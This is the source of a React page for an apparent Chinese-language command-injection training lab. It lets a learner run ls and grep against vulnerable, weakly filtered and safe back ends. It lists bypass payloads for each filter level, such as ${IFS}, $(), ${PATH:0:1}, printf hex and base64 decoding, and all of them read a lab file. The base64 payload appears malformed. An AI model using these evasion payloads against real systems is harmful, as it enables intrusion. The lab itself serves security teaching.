import { Alert, Button, Card, Form, Input, Row, Col, Space, Typography, Tag, Tabs, Collapse } from 'antd';
import { CodeOutlined, BugOutlined, SafetyCertificateOutlined, ThunderboltOutlined, FileTextOutlined, SearchOutlined } from '@ant-design/icons';
import { useState, useEffect } from 'react';
import { commandExecutionApi } from '../../utils/api';
import useRequestRunner from '../../hooks/useRequestRunner';
import { reportCoachUi } from '../xss/_shared/coachUi';
import DarkSelect from '../../components/DarkSelect';

const { Title, Paragraph, Text } = Typography;

const MODE_OPTIONS = [
  { value: 'vuln', label: 'VULN（原始漏洞）' },
  { value: 'weak', label: 'WEAK（错误修复）' },
  { value: 'safe', label: 'SAFE（正确修复）' },
];

const WEAK_LEVEL_OPTIONS = [
  { value: 1, label: 'WEAK-1：拦截分号、逻辑与、管道符' },
  { value: 2, label: 'WEAK-2：拦截分号、逻辑与、管道符、反引号、$()、换行符' },
  { value: 3, label: 'WEAK-3：拦截空格（替换为空）' },
  { value: 4, label: 'WEAK-4：拦截斜杠、cat、passwd' },
  { value: 5, label: 'WEAK-5：拦截 cat、passwd（需要自解码）' },
];

const PAYLOADS_BY_WEAK_LEVEL = {
  1: [
    {
      kind: '换行符绕过',
      expect: '使用 %0a 换行符绕过分号拦截',
      value: '/tmp%0acat /opt/lab/hosts',
    },
    {
      kind: '后台执行',
      expect: '使用 & 后台执行',
      value: '/tmp& cat /opt/lab/hosts',
    },
    {
      kind: '逻辑或',
      expect: '使用 || 逻辑或',
      value: '/tmp || cat /opt/lab/hosts',
    },
  ],
  2: [
    {
      kind: '变量拼接',
      expect: '使用变量拼接命令',
      value: '/tmp${IFS}cat${IFS}/opt/lab/hosts',
    },
    {
      kind: '命令替换',
      expect: '使用 $() 命令替换',
      value: '/tmp$(cat${IFS}/opt/lab/hosts)',
    },
  ],
  3: [
    {
      kind: 'IFS 替代空格',
      expect: '使用 ${IFS} 替代空格',
      value: '/tmp;cat${IFS}/opt/lab/hosts',
    },
    {
      kind: '制表符',
      expect: '使用制表符 %09',
      value: '/tmp;cat%09/opt/lab/hosts',
    },
  ],
  4: [
    {
      kind: '变量切片取斜杠',
      expect: '使用 ${PATH:0:1} 取斜杠',
      value: '/tmp;cat${PATH:0:1}opt${PATH:0:1}lab${PATH:0:1}hosts',
    },
    {
      kind: 'printf 还原命令',
      expect: '使用 printf 还原 cat 命令',
      value: '/tmp;$(printf%09\\x63\\x61\\x74)%09/opt/lab/hosts',
    },
  ],
  5: [
    {
      kind: 'Base64 解码',
      expect: '使用 base64 解码命令',
      value: '/tmp;$(echo%09Y2F0b3Q9vcHQvc2xhvc3Rz%09|%09base64%09-d)',
    },
    {
      kind: 'printf 十六进制',
      expect: '使用 printf 输出十六进制字符',
      value: '/tmp;$(printf%09\\x63\\x61\\x74)%09/opt/lab/hosts',
    },
  ],
};

export default function CommandExecutionFile() {
  const [activeTab, setActiveTab] = useState('ls');
  const [mode, setMode] = useState('vuln');
  const [weakLevel, setWeakLevel] = useState(1);
  const [path, setPath] = useState('/tmp');
  const [keyword, setKeyword] = useState('INFO');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  const { run } = useRequestRunner();

  useEffect(() => {
    reportCoachUi({
      context: 'command_execution_file_intro',
      mode: 'vuln',
      focus: 'intro',
      input: '',
      extras: {}
    });
  }, []);

  const handleExecuteLs = async () => {
    setLoading(true);
    setResult(null);
    
    try {
      const response = await run(() => commandExecutionApi.ls(mode, path, weakLevel));
      setResult(response);
      
      reportCoachUi({
        context: `command_execution_file_ls_${mode}`,
        mode: mode,
        focus: 'execute',
        input: path,
        extras: { weakLevel }
      });
    } catch (error) {
      console.error('Execution failed:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleExecuteGrep = async () => {
    setLoading(true);
    setResult(null);
    
    try {
      const response = await run(() => commandExecutionApi.grep(mode, keyword, weakLevel));
      setResult(response);
      
      reportCoachUi({
        context: `command_execution_file_grep_${mode}`,
        mode: mode,
        focus: 'execute',
        input: keyword,
        extras: { weakLevel }
      });
    } catch (error) {
      console.error('Execution failed:', error);
    } finally {
      setLoading(false);
    }
  };

  const handlePayloadSelect = (payload) => {
    if (activeTab === 'ls') {
      setPath(payload.value);
    } else {
      setKeyword(payload.value);
    }
  };

  const payloads = PAYLOADS_BY_WEAK_LEVEL[weakLevel] || [];

  return (
    <div style={{ padding: '24px' }}>
      <Card>
        <Space orientation="vertical" size="large" style={{ width: '100%' }}>
          <div>
            <Title level={2}>
              <FileTextOutlined /> 命令注入 - 文件操作
            </Title>
            <Paragraph>
              文件操作场景中的命令注入漏洞，通常出现在文件管理、日志分析等系统的参数拼接中。
              本场景模拟文件管理系统的命令注入漏洞。
            </Paragraph>
          </div>

          <Alert
            title="安全提示"
            description={
              <ul>
                <li>本靶场环境已启用安全隔离，所有命令执行限制在 lab 目录内</li>
                <li>绝对路径、路径遍历（..）、特殊符号（~）已被拦截</li>
                <li>cat 命令仅允许读取白名单文件（hosts/app.log/passwd.mock）</li>
                <li>WAF 防护级别可调，用于演示不同绕过技术</li>
                <li>SAFE 模式使用参数化执行，可有效防止命令注入</li>
              </ul>
            }
            type="warning"
            showIcon
            icon={<SafetyCertificateOutlined />}
          />

          <Tabs
            activeKey={activeTab}
            onChange={setActiveTab}
            items={[
              {
                key: 'ls',
                label: '文件列表 (ls)',
                children: (
                  <Space orientation="vertical" style={{ width: '100%' }}>
                    <Row gutter={16}>
                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>选择模式：</Text>
                            <DarkSelect
                              value={mode}
                              onChange={setMode}
                              style={{ width: '100%', marginTop: 8 }}
                              options={MODE_OPTIONS}
                            />
                          </div>
                        </Space>
                      </Col>

                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>WAF 级别：</Text>
                            <DarkSelect
                              value={weakLevel}
                              onChange={setWeakLevel}
                              style={{ width: '100%', marginTop: 8 }}
                              options={WEAK_LEVEL_OPTIONS}
                              disabled={mode !== 'weak'}
                            />
                          </div>
                        </Space>
                      </Col>

                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>输入路径：</Text>
                            <Input
                              value={path}
                              onChange={(e) => setPath(e.target.value)}
                              placeholder="/tmp"
                              style={{ marginTop: 8 }}
                              onPressEnter={handleExecuteLs}
                            />
                          </div>

                          <Button
                            type="primary"
                            onClick={handleExecuteLs}
                            loading={loading}
                            icon={<ThunderboltOutlined />}
                            style={{ marginTop: 8 }}
                          >
                            执行 Ls
                          </Button>
                        </Space>
                      </Col>
                    </Row>
                  </Space>
                ),
              },
              {
                key: 'grep',
                label: '日志搜索 (grep)',
                children: (
                  <Space orientation="vertical" style={{ width: '100%' }}>
                    <Row gutter={16}>
                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>选择模式：</Text>
                            <DarkSelect
                              value={mode}
                              onChange={setMode}
                              style={{ width: '100%', marginTop: 8 }}
                              options={MODE_OPTIONS}
                            />
                          </div>
                        </Space>
                      </Col>

                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>WAF 级别：</Text>
                            <DarkSelect
                              value={weakLevel}
                              onChange={setWeakLevel}
                              style={{ width: '100%', marginTop: 8 }}
                              options={WEAK_LEVEL_OPTIONS}
                              disabled={mode !== 'weak'}
                            />
                          </div>
                        </Space>
                      </Col>

                      <Col span={8}>
                        <Space orientation="vertical" style={{ width: '100%' }}>
                          <div>
                            <Text strong>搜索关键词：</Text>
                            <Input
                              value={keyword}
                              onChange={(e) => setKeyword(e.target.value)}
                              placeholder="INFO"
                              style={{ marginTop: 8 }}
                              onPressEnter={handleExecuteGrep}
                            />
                          </div>

                          <Button
                            type="primary"
                            onClick={handleExecuteGrep}
                            loading={loading}
                            icon={<SearchOutlined />}
                            style={{ marginTop: 8 }}
                          >
                            执行 Grep
                          </Button>
                        </Space>
                      </Col>
                    </Row>
                  </Space>
                ),
              },
            ]}
          />

          {mode === 'weak' && payloads.length > 0 && (
            <Collapse
              items={[
                {
                  key: 'payloads',
                  label: '推荐 Payload',
                  children: (
                    <Space orientation="vertical" style={{ width: '100%' }}>
                      {payloads.map((payload, index) => (
                        <div key={index}>
                          <Tag color="blue" style={{ marginBottom: 8 }}>
                            {payload.kind}
                          </Tag>
                          <div style={{ marginBottom: 4 }}>
                            <Text type="secondary">{payload.expect}</Text>
                          </div>
                          <Input
                            value={payload.value}
                            readOnly
                            style={{ fontFamily: 'monospace', fontSize: 12 }}
                            addonAfter={
                              <Button
                                size="small"
                                type="link"
                                onClick={() => handlePayloadSelect(payload)}
                              >
                                使用
                              </Button>
                            }
                          />
                        </div>
                      ))}
                    </Space>
                  ),
                },
              ]}
            />
          )}

          {result && (
            <Card
              title="执行结果"
              style={{ marginTop: 16 }}
              extra={
                <Tag color={result.data.blocked ? 'red' : 'green'}>
                  {result.data.blocked ? '被拦截' : '执行成功'}
                </Tag>
              }
            >
              <Space orientation="vertical" style={{ width: '100%' }}>
                <div>
                  <Text strong>执行的命令：</Text>
                  <Text code style={{ marginLeft: 8 }}>{result.data.cmdBuilt}</Text>
                </div>

                <div>
                  <Text strong>退出码：</Text>
                  <Tag color={result.data.exitCode === 0 ? 'green' : 'red'}>
                    {result.data.exitCode}
                  </Tag>
                </div>

                <div>
                  <Text strong>执行时间：</Text>
                  <Text>{result.data.tookMs} ms</Text>
                </div>

                {result.data.blocked && (
                  <Alert
                    type="error"
                    showIcon
                    style={{ marginTop: 8, background: '#0f1419', border: '1px solid #2d3a4d' }}
                    title={<span style={{ color: '#e6edf3' }}>{result.data.blockedReason}</span>}
                  />
                )}

                {result.data.stdoutPreview && (
                  <div>
                    <Text strong>标准输出：</Text>
                    <pre style={{ 
                      background: '#f5f5f5',
                      padding: '12px',
                      marginTop: 8,
                      overflow: 'auto',
                      maxHeight: '400px'
                    }}>
                      {result.data.stdoutPreview}
                    </pre>
                  </div>
                )}

                {result.data.stderrPreview && (
                  <div>
                    <Text strong>标准错误：</Text>
                    <pre style={{ 
                      background: '#fff2f0',
                      padding: '12px',
                      marginTop: 8,
                      overflow: 'auto',
                      maxHeight: '400px'
                    }}>
                      {result.data.stderrPreview}
                    </pre>
                  </div>
                )}

                {result.data.stdoutPreview && result.data.stdoutPreview.includes('LAB_HOSTS_OK') && (
                  <Alert
                    type="success"
                    showIcon
                    style={{ marginTop: 8, background: '#0f1419', border: '1px solid #2d3a4d' }}
                    title={<span style={{ color: '#e6edf3' }}>成功！找到 LAB_HOSTS_OK 标记</span>}
                  />
                )}
              </Space>
            </Card>
          )}
        </Space>
      </Card>
    </div>
  );
}